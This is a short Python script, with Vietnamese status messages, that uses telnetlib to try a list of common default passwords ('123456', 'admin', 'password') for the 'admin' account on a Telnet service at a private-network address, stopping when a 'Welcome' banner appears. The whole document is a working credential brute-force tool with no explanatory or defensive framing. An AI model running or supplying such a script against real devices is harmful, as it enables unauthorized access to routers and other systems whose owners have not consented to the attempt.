import telnetlib

target = "192.168.1.20"
user = "admin"
passwords = ["123456", "admin", "password"]

for pw in passwords:
    try:
        tn = telnetlib.Telnet(target, timeout=5)
        tn.read_until(b"login: ")
        tn.write(user.encode() + b"\n")
        tn.read_until(b"Password: ")
        tn.write(pw.encode() + b"\n")
        output = tn.read_some()
        if b"Welcome" in output:
            print(f"✅ Đăng nhập thành công với mật khẩu: {pw}")
            break
        tn.close()
    except Exception as e:
        print(f"❌ Thử mật khẩu thất bại: {pw} - {e}")
